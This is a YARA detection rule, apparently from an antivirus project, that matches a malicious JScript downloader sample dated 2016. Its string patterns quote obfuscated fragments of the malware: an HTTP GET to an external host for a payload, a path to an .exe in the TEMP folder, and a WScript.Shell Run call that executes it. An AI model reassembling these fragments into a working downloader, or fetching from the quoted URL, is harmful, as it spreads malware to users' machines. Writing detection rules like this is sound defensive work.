rule sig_20160330_b1ee819fc18e483780e73a40caa21a52 {
  meta:
    description = "datamaliciousorder - file 20160330_b1ee819fc18e483780e73a40caa21a52.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "728a1c76316a5bd92690322899e19183f3c1c3bf365ee0ec2c0dcc0cd13d7226"

  strings:
    $s1  = "_PK[_RJ](\"GET\", \"http://hollandfoodexchange.com/d7jsa\", false);" fullword ascii
    $s2  = "function _Y(_WV, _G0){_FL = _FL * 1; return _WV - _G0;};" fullword ascii
    $s3  = "var _HE = function _B() {return WScript[_U1](\"WScript\"+\".Shell\");}(), _QK = 11;" fullword ascii
    $s4  = "if (_PK[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _P0(){return _UE + \"\";};" fullword ascii
    $s6  = "function _D() {return _HE[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"CJsJOjgQe6jrU.ex\" + \"e\";};" fullword ascii
    $s7  = "function _U() {return ((_G == true) && (_G == _MS)) ? 1 : _FL;};" fullword ascii
    $s8  = "function _FY(_ZN){_HE[\"Run\"](_ZN, _FL, _FL);};" fullword ascii
    $s9  = "function _K()" fullword ascii
    $s10 = " while (_DK){" fullword ascii
    $s11 = "return _Y(_DZ, _TH);" fullword ascii
    $s12 = "function _P(){return 22;};" fullword ascii
    $s13 = "function _Z(_YP) {var _JI = (1, 2, 3, 4, 5, _YP); return _JI;};" fullword ascii
    $s14 = "function _N(){return _U1;};" fullword ascii
    $s15 = "var _T = new this[\"Date\"]();" fullword ascii
    $s16 = "var _G = false;" fullword ascii
    $s17 = "_G = true; " fullword ascii
    $s18 = "var _V = false;" fullword ascii
    $s19 = "var _MS = false;" fullword ascii
    $s20 = "_MS = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}